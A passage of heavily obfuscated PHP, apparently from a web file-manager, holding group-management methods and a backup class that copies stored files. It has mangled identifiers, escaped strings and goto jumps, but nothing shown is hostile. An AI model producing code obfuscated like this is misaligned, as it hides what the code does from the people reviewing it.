$±†Üš¼É)))->field($ÑŞÔ¢şô[2073])->select(); if (!$ï×ëœ“·) { return !1; } $ŠÓºøÎ™ = array(); foreach ($ï×ëœ“· as $‚æ÷®÷±) { $ŠÓºøÎ™[] = "\x73\145\x6c\x65\x63\x74\x20\147\162\x6f\x75\x70\x49\104\40\146\162\157\155\40\x60\147\162\157\x75\x70\140\40\167\x68\x65\162\x65\40\x70\x61\162\145\x6e\x74\114\x65\x76\x65\154\x20\x6c\151\153\145\x20\x27{$‚æ÷®÷±[$ÑŞÔ¢şô[568]]}{$‚æ÷®÷±[$ÑŞÔ¢şô[1977]]}\54\x25\x27"; } $ŠÓºøÎ™ = implode($ÑŞÔ¢şô[2074], $ŠÓºøÎ™); $ï×ëœ“· = $this->query($ŠÓºøÎ™); if (!$ï×ëœ“·) { return array(); } $±†Üš¼É = array_to_keyvalue($ï×ëœ“·, $ÑŞÔ¢şô[12], $ÑŞÔ¢şô[1977]); return array_unique($±†Üš¼É); } public function listByID($¡Ã×Ìë) { $„ü—Ãû™ =& $_SERVER[÷åé¼î]; if (!$¡Ã×Ìë) { return array(); } $Ï¼û›› = array($„ü—Ãû™[1977] => array($„ü—Ãû™[7], $¡Ã×Ìë)); $Üôã„« = $this->where($Ï¼û››)->select(); $Üôã„« = array_sort_keep($Üôã„«, $„ü—Ãû™[1977], $¡Ã×Ìë); $this->_listDataApply($Üôã„«); return $Üôã„«; } public function listSearch($¿Æ¦øñä) { $ƒÂ²¶óô =& $_SERVER[÷åé¼î]; $èïÒäü® = trim($¿Æ¦øñä[$ƒÂ²¶óô[2075]]); $ı¦…Ã˜à = explode($ƒÂ²¶óô[53], $èïÒäü®); if (!$èïÒäü® || count($ı¦…Ã˜à) == 1) { return $this->listSearchNow($¿Æ¦øñä); } $Ñ—§ÜÎ÷ = array($ƒÂ²¶óô[429] => array()); foreach ($ı¦…Ã˜à as $š¾Ğ¡°ï) { if (!trim($š¾Ğ¡°ï)) { continue; } $¿Æ¦øñä[$ƒÂ²¶óô[2075]] = $š¾Ğ¡°ï; $¶ ÓÖş = $this->listSearchNow($¿Æ¦øñä); $Ñ—§ÜÎ÷[$ƒÂ²¶óô[429]] = array_merge($Ñ—§ÜÎ÷[$ƒÂ²¶óô[429]], $¶ ÓÖş[$ƒÂ²¶óô[429]]); } $Ñ—§ÜÎ÷[$ƒÂ²¶óô[429]] = array_unique_by_key($Ñ—§ÜÎ÷[$ƒÂ²¶óô[429]], $ƒÂ²¶óô[1977]); $Ñ—§ÜÎ÷[$ƒÂ²¶óô[426]] = array($ƒÂ²¶óô[427] => count($Ñ—§ÜÎ÷[$ƒÂ²¶óô[429]]), $ƒÂ²¶óô[423] => 20, $ƒÂ²¶óô[413] => 1, $ƒÂ²¶óô[428] => 1); return $Ñ—§ÜÎ÷; } public function listSearchNow($²îîØ»¿) { $Æµ¿Æúê =& $_SERVER[÷åé¼î]; $¶Á‘ù¤‡ = trim($²îîØ»¿[$Æµ¿Æúê[2075]]); $Ó§—Ã² = isset($²îîØ»¿[$Æµ¿Æúê[2076]]) ? $²îîØ»¿[$Æµ¿Æúê[2076]] : !1; if (!trim($¶Á‘ù¤‡)) { return !1; } $¶Á‘ù¤‡ = str_replace($Æµ¿Æúê[2077], $Æµ¿Æúê[2078], $¶Á‘ù¤‡); $ ÈşåÕí = array($Æµ¿Æúê[1977] => array($Æµ¿Æúê[443], "{$¶Á‘ù¤‡}\45"), $Æµ¿Æúê[32] => array($Æµ¿Æúê[443], "\x25{$¶Á‘ù¤‡}\x25"), $Æµ¿Æúê[1072] => $Æµ¿Æúê[2079]); if ($Ó§—Ã²) { $•úüî© = $this->getInfoSimple($Ó§—Ã²); $Íš¶İêû = $•úüî©[$Æµ¿Æúê[568]] . $Ó§—Ã² . $Æµ¿Æúê[597]; $ ÈşåÕí = array($ ÈşåÕí, array($Æµ¿Æúê[568] => array($Æµ¿Æúê[443], $Íš¶İêû))); } $ ÈşåÕí = $this->parseWhereLike($ ÈşåÕí); $§µÃ£÷ = $this->_makeOrder()->where($ ÈşåÕí)->selectPage(20); $§µÃ£÷ = $§µÃ£÷ ? $§µÃ£÷ : array($Æµ¿Æúê[429] => array(), $Æµ¿Æúê[426] => array()); if (!$§µÃ£÷ || count($§µÃ£÷[$Æµ¿Æúê[429]]) < 5 && Input::check($¶Á‘ù¤‡, $Æµ¿Æúê[378])) { $¨…”ü—ç = $this->groupChildrenAll($Ó§—Ã²); $•öŠ–èë = $this->_searchFromMeta($Æµ¿Æúê[521], $¶Á‘ù¤‡, 10, $¨…”ü—ç); $Ï£ÛÉÌª = $this->_searchFromMeta($Æµ¿Æúê[522], $¶Á‘ù¤‡, 10, $¨…”ü—ç); $Üëá™€Î = array_merge($•öŠ–èë, $Ï£ÛÉÌª, $§µÃ£÷[$Æµ¿Æúê[429]]); $§µÃ£÷[$Æµ¿Æúê[429]] = array_unique_by_key($Üëá™€Î, $Æµ¿Æúê[1977]); $§µÃ£÷[$Æµ¿Æúê[426]][$Æµ¿Æúê[427]] = count($§µÃ£÷[$Æµ¿Æúê[429]]); $§µÃ£÷[$Æµ¿Æúê[426]][$Æµ¿Æúê[428]] = ceil($§µÃ£÷[$Æµ¿Æúê[426]][$Æµ¿Æúê[427]] / $§µÃ£÷[$Æµ¿Æúê[426]][$Æµ¿Æúê[423]]); } $this->_listDataApply($§µÃ£÷[$Æµ¿Æúê[429]]); return $§µÃ£÷; } protected function groupChildrenAll($Ù…­¸Ä¾) { $¼ ºèä‘ =& $_SERVER[÷åé¼î]; if (!$Ù…­¸Ä¾) { return !1; } if (!is_array($Ù…­¸Ä¾)) { $Ù…­¸Ä¾ = array($Ù…­¸Ä¾); } $¶è¢Üğø = $Ù…­¸Ä¾; foreach ($Ù…­¸Ä¾ as $¤ãà†Œó) { $†‚ñ£ÕÁ = $this->getInfoSimple($¤ãà†Œó); $ÁÍ´½‘ˆ = array($¼ ºèä‘[568] => array($¼ ºèä‘[443], $†‚ñ£ÕÁ[$¼ ºèä‘[568]] . $¤ãà†Œó . $¼ ºèä‘[597])); $ˆñ¡”õÅ = $this->field($¼ ºèä‘[1977])->where($ÁÍ´½‘ˆ)->select(); $¶è¢Üğø = array_merge($¶è¢Üğø, array_to_keyvalue($ˆñ¡”õÅ, $¼ ºèä‘[12], $¼ ºèä‘[1977])); } return array_unique($¶è¢Üğø); } private function _searchFromMeta($€×†öÄ, $„¥ìßûÚ, $Áò×ó›, $¬¶¥âäŞ) { $Ê¯‡œ³Ú =& $_SERVER[÷åé¼î]; $„¥ìßûÚ = strtolower($„¥ìßûÚ); $áÅ€í°™ = array($Ê¯‡œ³Ú[97] => $€×†öÄ, $Ê¯‡œ³Ú[434] => array($Ê¯‡œ³Ú[443], "\x25{$„¥ìßûÚ}\x25")); $áÅ€í°™ = $this->parseWhereLike($áÅ€í°™); if ($¬¶¥âäŞ) { $áÅ€í°™[$Ê¯‡œ³Ú[1977]] = array($Ê¯‡œ³Ú[7], $¬¶¥âäŞ); } $­”˜×É³ = Model($Ê¯‡œ³Ú[2080])->where($áÅ€í°™)->limit($Áò×ó›)->select(); if (!$­”˜×É³) { return array(); } $­”˜×É³ = array_to_keyvalue($­”˜×É³, $Ê¯‡œ³Ú[12], $Ê¯‡œ³Ú[1977]); $®Øò–ó = $this->where(array($Ê¯‡œ³Ú[2069] => array($Ê¯‡œ³Ú[7], $­”˜×É³)))->select(); if (!$®Øò–ó) { return array(); } return $®Øò–ó; } protected function _listDataApplyItem($«ô¶êå¬) { $‰Ñ³­ÌĞ = array($«ô¶êå¬); $this->_listDataApply($‰Ñ³­ÌĞ); return $‰Ñ³­ÌĞ[0]; } protected function _listDataApply(&$Â…™£) { $¼›öÒ÷‰ =& $_SERVER[÷åé¼î]; if (!$Â…™£) { return; } $±âêÊ‹× = array_to_keyvalue($Â…™£, $¼›öÒ÷‰[12], $¼›öÒ÷‰[1977]); $this->_listAppendChildren($Â…™£); $this->_listAppendChildrenMember($Â…™£); $this->_listAppendMeta($Â…™£, $±âêÊ‹×); $this->_listAppendParent($Â…™£); $this->_listAppendSourceRoot($Â…™£, $±âêÊ‹×); } private function _listAppendChildren(&$™Î”åëº) { $ë‰«å­Ğ =& $_SERVER[÷åé¼î]; $œş»›Ñ‡ = array_to_keyvalue($™Î”åëº, $ë‰«å­Ğ[12], $ë‰«å­Ğ[1977]); $Éá½ûìè = array($ë‰«å­Ğ[192] => array($ë‰«å­Ğ[7], $œş»›Ñ‡)); $ÇÁÑôô¦ = array($ë‰«å­Ğ[192], $ë‰«å­Ğ[2081] => $ë‰«å­Ğ[549]); $Ñ¨¤ıÓ¡ = $this->field($ÇÁÑôô¦)->where($Éá½ûìè)->group($ë‰«å­Ğ[192])->select(); $Ï‹†®÷¦ = array_to_keyvalue($Ñ¨¤ıÓ¡, $ë‰«å­Ğ[192], $ë‰«å­Ğ[549]); foreach ($™Î”åëº as &$ÃÏ„Ş…È) { $ĞÓ¼ùå­ = $ÃÏ„Ş…È[$ë‰«å­Ğ[1977]]; $ÃÏ„Ş…È[$ë‰«å­Ğ[2082]] = isset($Ï‹†®÷¦[$ĞÓ¼ùå­]) ? intval($Ï‹†®÷¦[$ĞÓ¼ùå­]) : !1; } unset($ÃÏ„Ş…È); } private function _listAppendChildrenMember(&$ÂÖà†¨) { $ù„¡Ú’Ú =& $_SERVER[÷åé¼î]; $‘‘ĞÔë± = array_to_keyvalue($ÂÖà†¨, $ù„¡Ú’Ú[12], $ù„¡Ú’Ú[1977]); $åş­‚ñ’ = array($ù„¡Ú’Ú[1977] => array($ù„¡Ú’Ú[7], $‘‘ĞÔë±)); $à“‚şëí = array($ù„¡Ú’Ú[1977], $ù„¡Ú’Ú[2081] => $ù„¡Ú’Ú[549]); $Á§¿Ù‚® = Model($ù„¡Ú’Ú[2071])->field($à“‚şëí)->where($åş­‚ñ’)->group($ù„¡Ú’Ú[1977])->select(); $‰«³­å = array_to_keyvalue($Á§¿Ù‚®, $ù„¡Ú’Ú[1977], $ù„¡Ú’Ú[549]); foreach ($ÂÖà†¨ as &$‘ôêÇß¼) { $…Ë—Ïæ = $‘ôêÇß¼[$ù„¡Ú’Ú[1977]]; $‘ôêÇß¼[$ù„¡Ú’Ú[2083]] = isset($‰«³­å[$…Ë—Ïæ]) ? intval($‰«³­å[$…Ë—Ïæ]) : !1; } unset($‘ôêÇß¼); } private function _listAppendMeta(&$››¯ø’, $­øÀìî) { $ˆ·²ÓàÏ =& $_SERVER[÷åé¼î]; $½¤ÌÀÖ§ = array($ˆ·²ÓàÏ[1977] => array($ˆ·²ÓàÏ[7], $­øÀìî)); $ú¦ô£ŒÃ = Model($ˆ·²ÓàÏ[2070])->where($½¤ÌÀÖ§)->select(); $ú¦ô£ŒÃ = array_to_keyvalue_group($ú¦ô£ŒÃ, $ˆ·²ÓàÏ[1977]); foreach ($ú¦ô£ŒÃ as &$•œŒáœ) { $•œŒáœ = array_to_keyvalue($•œŒáœ, $ˆ·²ÓàÏ[97], $ˆ·²ÓàÏ[434]); } unset($•œŒáœ); foreach ($››¯ø’ as &$ÄÄÃá×á) { $ÄÄÃá×á[$ˆ·²ÓàÏ[523]] = array(); if (isset($ú¦ô£ŒÃ[$ÄÄÃá×á[$ˆ·²ÓàÏ[1977]]])) { $ÄÄÃá×á[$ˆ·²ÓàÏ[523]] = $ú¦ô£ŒÃ[$ÄÄÃá×á[$ˆ·²ÓàÏ[1977]]]; } } unset($ÄÄÃá×á); } protected function parentLevelArray($œòş¥¹Ğ) { $ášƒ”ÔØ =& $_SERVER[÷åé¼î]; $œòş¥¹Ğ = explode($ášƒ”ÔØ[50], trim($œòş¥¹Ğ, $ášƒ”ÔØ[50])); $œòş¥¹Ğ = array_remove_value($œòş¥¹Ğ, $ášƒ”ÔØ[228]); return $œòş¥¹Ğ; } protected function parentInGroup($Õ›Ãó¤, $§Ä³¿¨¯) { $º¢°ı„á =& $_SERVER[÷åé¼î]; $ĞÜ‰ÃÕ = $this->getInfoSimple($Õ›Ãó¤); if (!$ĞÜ‰ÃÕ) { return !0; } $Ëï©úÈ˜ = $this->parentLevelArray($ĞÜ‰ÃÕ[$º¢°ı„á[568]]); $Ëï©úÈ˜[] = $Õ›Ãó¤; foreach ($Ëï©úÈ˜ as $Õ›Ãó¤) { if (in_array($Õ›Ãó¤ . $º¢°ı„á[12], $§Ä³¿¨¯)) { return !0; } } return !1; } private function _listAppendParent(&$æŠ¥–µ€) { $éÏ½ÒÙ£ =& $_SERVER[÷åé¼î]; $è‘¹ôóò = array(); foreach ($æŠ¥–µ€ as &$ëÈœô¯) { $è‘¹ôóò[$ëÈœô¯[$éÏ½ÒÙ£[1977]]] = $ëÈœô¯[$éÏ½ÒÙ£[32]]; $£¼­ß²€ = $this->parentLevelArray($ëÈœô¯[$éÏ½ÒÙ£[568]]); foreach ($£¼­ß²€ as $—ŸÊµÃÄ) { if (!isset($è‘¹ôóò[$—ŸÊµÃÄ])) { $è‘¹ôóò[$—ŸÊµÃÄ] = 0; } } } unset($ëÈœô¯); foreach ($è‘¹ôóò as $òÖÓ‰èÛ => $üÄ¸‡·…) { if ($üÄ¸‡·…) { continue; } $ıŠ‹úÂ = $this->getInfoSimple($òÖÓ‰èÛ); $è‘¹ôóò[$òÖÓ‰èÛ] = $ıŠ‹úÂ[$éÏ½ÒÙ£[32]]; } $©ÍêóÜ = $GLOBALS[$éÏ½ÒÙ£[6]][$éÏ½ÒÙ£[92]][$éÏ½ÒÙ£[2084]]; if (KodUser::isRoot()) { $©ÍêóÜ = !1; } foreach ($æŠ¥–µ€ as &$ëÈœô¯) { $£¼­ß²€ = $this->parentLevelArray($ëÈœô¯[$éÏ½ÒÙ£[568]]); $Ó¡³ççÎ = $éÏ½ÒÙ£[12]; foreach ($£¼­ß²€ as $òÖÓ‰èÛ => $—ŸÊµÃÄ) { if ($©ÍêóÜ && $òÖÓ‰èÛ == 0) { continue; } $Ó¡³ççÎ .= $è‘¹ôóò[$—ŸÊµÃÄ] . $éÏ½ÒÙ£[8]; } if ($£¼­ß²€) { $Ó¡³ççÎ .= $ëÈœô¯[$éÏ½ÒÙ£[32]]; } $ëÈœô¯[$éÏ½ÒÙ£[573]] = str_replace($éÏ½ÒÙ£[576], $éÏ½ÒÙ£[8], $Ó¡³ççÎ); } unset($ëÈœô¯); } private function _listAppendSourceRoot(&$Ê·æ™Š, $ˆğßèá) { $”Ñ§ï±ø =& $_SERVER[÷åé¼î]; $äÜŒı¿ = Model($”Ñ§ï±ø[889])->listSourceRoot(SourceModel::TYPE_GROUP, $ˆğßèá); $äÜŒı¿ = array_to_keyvalue($äÜŒı¿, $”Ñ§ï±ø[553]); $äÜŒı¿ = array_remove_key($äÜŒı¿, $”Ñ§ï±ø[553]); foreach ($Ê·æ™Š as &$óúçôœ) { $óúçôœ[$”Ñ§ï±ø[90]] = $äÜŒı¿[$óúçôœ[$”Ñ§ï±ø[1977]]] ? $äÜŒı¿[$óúçôœ[$”Ñ§ï±ø[1977]]] : array(); } unset($óúçôœ); } protected function groupMerge($Àæµ™ì­) { $Àæµ™ì­ = array_values(array_unique($Àæµ™ì­)); $ˆİ­¦À = array(); for ($™´ÇëĞ = 0; $™´ÇëĞ < count($Àæµ™ì­); $™´ÇëĞ++) { $Ôõ‘¤ùğ = !1; for ($­Ê¿‡úü = 0; $­Ê¿‡úü < count($Àæµ™ì­); $­Ê¿‡úü++) { if ($™´ÇëĞ == $­Ê¿‡úü) { continue; } if ($this->isParentOf($Àæµ™ì­[$­Ê¿‡úü], $Àæµ™ì­[$™´ÇëĞ])) { $Ôõ‘¤ùğ = !0; break; } } if (!$Ôõ‘¤ùğ) { $ˆİ­¦À[] = $Àæµ™ì­[$™´ÇëĞ]; } } return $ˆİ­¦À; } protected function isParentOf($©…Íİ¨§, $¿ßæ˜’”) { $ŠÃ¾«ê° =& $_SERVER[÷åé¼î]; if (!$©…Íİ¨§ || !$¿ßæ˜’” || $©…Íİ¨§ == $¿ßæ˜’”) { return !1; } $¹…ŸÚî÷ = $this->getInfoSimple($©…Íİ¨§); $·ÑæÉ­Õ = $this->getInfoSimple($¿ßæ˜’”); $òÒá©“ = $¹…ŸÚî÷[$ŠÃ¾«ê°[568]] . $©…Íİ¨§ . $ŠÃ¾«ê°[50]; if (substr($·ÑæÉ­Õ[$ŠÃ¾«ê°[568]], 0, strlen($òÒá©“)) == $òÒá©“) { return !0; } return !1; } public function groupShowRoot($’‚íå, $×ÂĞ¶ø­ = false) { $¯È–‰ğÒ =& $_SERVER[÷åé¼î]; $™ƒÛ¨ó¡ = $this->getInfo($’‚íå); if (!$™ƒÛ¨ó¡) { return array(); } $î¸Í¼Õ = $this->parentLevelArray($™ƒÛ¨ó¡[$¯È–‰ğÒ[568]]); $´¨ÚÛ‘Å = array($’‚íå); if (count($î¸Í¼Õ) == 0) { return $´¨ÚÛ‘Å; } if ($×ÂĞ¶ø­ && count($î¸Í¼Õ) == 1) { return $´¨ÚÛ‘Å; } if (!$™ƒÛ¨ó¡[$¯È–‰ğÒ[523]] || !isset($™ƒÛ¨ó¡[$¯È–‰ğÒ[523]][$¯È–‰ğÒ[2067]]) || $™ƒÛ¨ó¡[$¯È–‰ğÒ[523]][$¯È–‰ğÒ[2067]] == $¯È–‰ğÒ[841]) { return $this->groupShowRoot($î¸Í¼Õ[count($î¸Í¼Õ) - 1], $×ÂĞ¶ø­); } if ($™ƒÛ¨ó¡[$¯È–‰ğÒ[523]][$¯È–‰ğÒ[2067]] == $¯È–‰ğÒ[417]) { $¼“ÚèıŸ = explode($¯È–‰ğÒ[50], $™ƒÛ¨ó¡[$¯È–‰ğÒ[523]][$¯È–‰ğÒ[2068]]); if ($¼“ÚèıŸ) { $´¨ÚÛ‘Å = array_merge($´¨ÚÛ‘Å, $¼“ÚèıŸ); } } return $´¨ÚÛ‘Å; } protected function resetParentLevel() { $×£ŠŒ€ô =& $_SERVER[÷åé¼î]; $¼…³ìï¡ = $×£ŠŒ€ô[1977]; $–î³˜¿Ÿ = $this->select(); $–î³˜¿Ÿ = array_to_keyvalue($–î³˜¿Ÿ, $¼…³ìï¡); foreach ($–î³˜¿Ÿ as $¿„²—áù) { $¨á’Ù = $¿„²—áù; $ŒêîÃ¿ = array(); while ($¨á’Ù[$×£ŠŒ€ô[192]] != 0) { $ŒêîÃ¿[] = $¨á’Ù[$×£ŠŒ€ô[192]]; $¨á’Ù = $–î³˜¿Ÿ[$¨á’Ù[$×£ŠŒ€ô[192]]]; } $ŒêîÃ¿[] = 0; $ŒêîÃ¿ = $×£ŠŒ€ô[50] . implode($×£ŠŒ€ô[50], array_reverse($ŒêîÃ¿)) . $×£ŠŒ€ô[50]; $this->setNamePinyin($¿„²—áù[$¼…³ìï¡], $¿„²—áù[$×£ŠŒ€ô[32]]); $this->where(array($¼…³ìï¡ => $¿„²—áù[$¼…³ìï¡]))->save(array($×£ŠŒ€ô[636] => $ŒêîÃ¿)); } return $–î³˜¿Ÿ; } public function groupNameAuto($í»ĞáŞ¬, $Î¸®‰Ùé) { $Ò§°¶»è =& $_SERVER[÷åé¼î]; $Ö¥–´˜• = $this->where(array($Ò§°¶»è[461] => $í»ĞáŞ¬))->getField($Ò§°¶»è[32], !0); if (!$Ö¥–´˜• || !in_array($Î¸®‰Ùé, $Ö¥–´˜•)) { return $Î¸®‰Ùé; } for ($·Øè‹ = 1; $·Øè‹ <= count($Ö¥–´˜•) + 1; $·Øè‹++) { $ÊÉºöÕ = $Î¸®‰Ùé . "\50{$·Øè‹}\x29"; if (!in_array($ÊÉºöÕ, $Ö¥–´˜•)) { return $ÊÉºöÕ; } } } public function groupSwitch($ÈâÉ•Í, $·Ú¾ë˜ò) { $²Èå›ñ• =& $_SERVER[÷åé¼î]; $×ÖÊÜ‚¾ = array($²Èå›ñ•[1977] => array($²Èå›ñ•[7], array($ÈâÉ•Í, $·Ú¾ë˜ò))); $•·İà£­ = $this->where($×ÖÊÜ‚¾)->select(); $•·İà£­ = array_to_keyvalue($•·İà£­, $²Èå›ñ•[1977]); if (!isset($•·İà£­[$ÈâÉ•Í]) || !isset($•·İà£­[$·Ú¾ë˜ò]) || $•·İà£­[$ÈâÉ•Í][$²Èå›ñ•[192]] == 0) { return !1; } $×ÖÊÜ‚¾ = array($²Èå›ñ•[1977] => $ÈâÉ•Í); $ğ€ñ‘¨ˆ = Model($²Èå›ñ•[2071])->where($×ÖÊÜ‚¾)->select(); if (!$ğ€ñ‘¨ˆ) { $ğ€ñ‘¨ˆ = array(); } foreach ($ğ€ñ‘¨ˆ as $ğÄææìµ) { $Òüü•¡â = $ğÄææìµ[$²Èå›ñ•[1779]]; $×ÖÊÜ‚¾ = array($²Èå›ñ•[1779] => $Òüü•¡â, $²Èå›ñ•[1977] => $·Ú¾ë˜ò); $›âËğ€é = Model($²Èå›ñ•[2071])->where($×ÖÊÜ‚¾)->find(); if (!$›âËğ€é) { $êôÇßÈß = array($·Ú¾ë˜ò => $ğÄææìµ[$²Èå›ñ•[2085]]); Model($²Èå›ñ•[582])->userGroupAdd($Òüü•¡â, $êôÇßÈß); } Model($²Èå›ñ•[582])->userGroupRemove($Òüü•¡â, $ÈâÉ•Í); } $×ÖÊÜ‚¾ = array($²Èå›ñ•[190] => 2, $²Èå›ñ•[192] => 0, $²Èå›ñ•[469] => 1, $²Èå›ñ•[553] => array($²Èå›ñ•[7], array($ÈâÉ•Í, $·Ú¾ë˜ò))); $Úºìı = Model($²Èå›ñ•[889])->where($×ÖÊÜ‚¾)->field($²Èå›ñ•[2086])->select(); $Úºìı = array_to_keyvalue($Úºìı, $²Èå›ñ•[553], $²Èå›ñ•[193]); $½ƒœöƒâ = !empty($Úºìı[$ÈâÉ•Í]) ? $Úºìı[$ÈâÉ•Í] : !1; if ($½ƒœöƒâ) { if (!$Úºìı[$·Ú¾ë˜ò]) { $Úºìı[$·Ú¾ë˜ò] = Model($²Èå›ñ•[889])->groupRootAdd($·Ú¾ë˜ò); } $Ÿ‡ÙŞà£ = $Úºìı[$·Ú¾ë˜ò]; $×ÖÊÜ‚¾ = array($²Èå›ñ•[192] => $½ƒœöƒâ); $Úºìı = Model($²Èå›ñ•[889])->where($×ÖÊÜ‚¾)->field($²Èå›ñ•[2087])->select(); if (!$Úºìı) { $Úºìı = array(); } Model($²Èå›ñ•[889])->moveClearAuth = !1; foreach ($Úºìı as $§Ì…í»ƒ) { $©ë©õú = $§Ì…í»ƒ[$²Èå›ñ•[469]] == $²Èå›ñ•[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($²Èå›ñ•[889])->move($§Ì…í»ƒ[$²Èå›ñ•[193]], $Ÿ‡ÙŞà£, $©ë©õú); } Model($²Èå›ñ•[889])->moveClearAuth = !0; $×ÖÊÜ‚¾ = array($²Èå›ñ•[190] => 2, $²Èå›ñ•[553] => $ÈâÉ•Í); $êŞ£ãÆœ = array($²Èå›ñ•[553] => $·Ú¾ë˜ò); Model($²Èå›ñ•[2088])->where($×ÖÊÜ‚¾)->save($êŞ£ãÆœ); Model($²Èå›ñ•[2089])->where($×ÖÊÜ‚¾)->save($êŞ£ãÆœ); } $this->_changeChildLevel($•·İà£­[$ÈâÉ•Í], $•·İà£­[$·Ú¾ë˜ò], !0); $this->where(array($²Èå›ñ•[192] => $ÈâÉ•Í))->save(array($²Èå›ñ•[192] => $·Ú¾ë˜ò)); $this->_clearChildrenCache($•·İà£­[$·Ú¾ë˜ò]); return !0; } } goto Aï½‘ë®ŞÅ; AÎ•‹‚ÖÁ¤: class BackupFile { public function __construct() { } public function index() { $´ıï²Ä = Backup::get(); $íæÇÎ£  = $´ıï²Ä[$_SERVER[÷åé¼î][353]][$_SERVER[÷åé¼î][230]][$_SERVER[÷åé¼î][525]]; $ô­Ÿ©áœ = array($_SERVER[÷åé¼î][526] => array($_SERVER[÷åé¼î][872], $íæÇÎ£ ), $_SERVER[÷åé¼î][873] => array($_SERVER[÷åé¼î][391], $´ıï²Ä[$_SERVER[÷åé¼î][817]])); $¿×Ñ®Ù° = (int) Model($_SERVER[÷åé¼î][854])->where($ô­Ÿ©áœ)->count($_SERVER[÷åé¼î][525]); $ÄşÁŠá = (int) Model($_SERVER[÷åé¼î][854])->where($ô­Ÿ©áœ)->sum($_SERVER[÷åé¼î][79]); $Ş€—ôŸá = new TaskFileTransfer($_SERVER[÷åé¼î][874], $_SERVER[÷åé¼î][848], $¿×Ñ®Ù°, LNG($_SERVER[÷åé¼î][849]) . $_SERVER[÷åé¼î][850] . LNG($_SERVER[÷åé¼î][875])); $Ş€—ôŸá->task[$_SERVER[÷åé¼î][828]] = $ÄşÁŠá; $œ“œëÃ = array($_SERVER[÷åé¼î][876] => $¿×Ñ®Ù°, $_SERVER[÷åé¼î][877] => $ÄşÁŠá, $_SERVER[÷åé¼î][878] => time()); Backup::set($œ“œëÃ); $‚ß¯‡ô° = !0; $÷ñ†¤°‘ = $this->storeIds(); $—ÕïÕÔ– = 1; $’€§æï = 1000; $Í˜şêØÁ = $Ï§ÔÉæ = 0; $¼Ò–Ü÷Í = array(); $ğ­Âö® = $½¥ÙË¸Â = 0; do { $‰‹øÀÜŒ = $_SERVER[÷åé¼î][879]; $›œ…€ü = Model($_SERVER[÷åé¼î][854])->where($ô­Ÿ©áœ)->field($‰‹øÀÜŒ)->order($_SERVER[÷åé¼î][880])->selectPage($’€§æï, $—ÕïÕÔ–); $œÂÈ­ = !empty($›œ…€ü[$_SERVER[÷åé¼î][429]]) ? $›œ…€ü[$_SERVER[÷åé¼î][429]] : array(); foreach ($œÂÈ­ as $Á’¼ÄÒü) { if (!$this->_fileExist($Á’¼ÄÒü, $¼Ò–Ü÷Í, $÷ñ†¤°‘)) { write_log("\146\151\154\x65\40\x6e\x6f\164\x20\x65\170\x69\163\164\x2e\x66\x69\x6c\145\x49\x44\x3a{$Á’¼ÄÒü[$_SERVER[÷åé¼î][525]]}\54\x20\x70\x61\x74\x68\x3a{$Á’¼ÄÒü[$_SERVER[÷åé¼î][87]]}", $_SERVER[÷åé¼î][881]); continue; } $îôË©Š™ = $Á’¼ÄÒü[$_SERVER[÷åé¼î][87]]; $ı¿¨ÁÉ” = "\173\x69\x6f\72{$´ıï²Ä[$_SERVER[÷åé¼î][817]]}\175" . substr($îôË©Š™, strlen("\173\x69\157\x3a{$Á’¼ÄÒü[$_SERVER[÷åé¼î][882]]}\x7d")); if (IO::exist($ı¿¨ÁÉ”)) { $Ş€—ôŸá->updateFileEnd($Á’¼ÄÒü[$_SERVER[÷åé¼î][32]], $Á’¼ÄÒü[$_SERVER[÷åé¼î][79]]); } else { $ı¿¨ÁÉ” = get_path_father($ı¿¨ÁÉ”); IO::mkdir($ı¿¨ÁÉ”); if (!IO::copy($îôË©Š™, $ı¿¨ÁÉ”, $_SERVER[÷åé¼î][883])) { write_log($_SERVER[÷åé¼î][884] . $îôË©Š™ . $_SERVER[÷åé¼î][868] . $ı¿¨ÁÉ” . $_SERVER[÷åé¼î][178], $_SERVER[÷åé¼î][848]); $‚ß¯‡ô° = !1; break; } } $íæÇÎ£  = $Á’¼ÄÒü[$_SERVER[÷åé¼î][525]]; $Ï§ÔÉæ += 1; $Í˜şêØÁ += $Á’¼ÄÒü[$_SERVER[÷åé¼î][79]]; $½¥ÙË¸Â += 1; $ğ­Âö® += $Á’¼ÄÒü[$_SERVER[÷åé¼î][79]]; if ($Í˜şêØÁ >= 1024 * 1024 * 100) { $œ“œëÃ = array($_SERVER[÷åé¼î][816] => $íæÇÎ£ , $_SERVER[÷åé¼î][885] => $½¥ÙË¸Â, $_SERVER[÷åé¼î][886] => $ğ­Âö®); Backup::set($œ“œëÃ); $Í˜şêØÁ = $Ï§ÔÉæ = 0; } } $‡ô›äë“ = count($œÂÈ­); $—ÕïÕÔ–++; } while ($‡ô›äë“ == $’€§æï); $Ş€—ôŸá->end(); $œ“œëÃ = array($_SERVER[÷åé¼î][887] => 1, $_SERVER[÷åé¼î][826] => time(), $_SERVER[÷åé¼î][840] => 1, $_SERVER[÷åé¼î][816] => $íæÇÎ£ , $_SERVER[÷åé¼î][888] => time()); if ($Ï§ÔÉæ) { $œ“œëÃ[$_SERVER[÷åé¼î][885]] = $½¥ÙË¸Â; $œ“œëÃ[$_SERVER[÷åé¼î][886]] = $ğ­Âö®; } Backup::set($œ“œëÃ); return !0; } private function _fileExist($ğÙî½·ñ, &$åÁıæ€œ, $î‡ç¤„) { $«™²ò¨‘ =& $_SERVER[÷åé¼î]; $şÈµ®Œ = $ğÙî½·ñ[$«™²ò¨‘[87]]; if (in_array($ğÙî½·ñ[$«™²ò¨‘[525]], $åÁıæ€œ)) { return !1; } if (!in_array($ğÙî½·ñ[$«™²ò¨‘[882]], $î‡ç¤„)) { return !1; } if (IO::exist($şÈµ®Œ)) { return !0; } $„·ÁáƒØ = get_path_father($şÈµ®Œ); if (IO::exist($„·ÁáƒØ)) { $åÁıæ€œ[] = $ğÙî½·ñ[$«™²ò¨‘[525]]; return !1; } $òîÀ¦ = array($«™²ò¨‘[882] => $ğÙî½·ñ[$«™²ò¨‘[882]], $«™²ò¨‘[87] => array($«™²ò¨‘[443], "{$„·ÁáƒØ}\45")); $¨øå§÷Ö = Model($«™²ò¨‘[854])->where($òîÀ¦)->field($«™²ò¨‘[526])->select(); $åÁıæ€œ = array_merge($åÁıæ€œ, array_to_keyvalue($¨øå§÷Ö, $«™²ò¨‘[12], $«™²ò¨‘[525])); return !1; } private function _fileFilter($Ä»—‡¢‘) { $ƒ‡ÆùıÈ =& $_SERVER[÷åé¼î]; return; if (empty($Ä»—‡¢‘)) { return; } $Ë’Œè„ = array($ƒ‡ÆùıÈ[525] => array($ƒ‡ÆùıÈ[7], 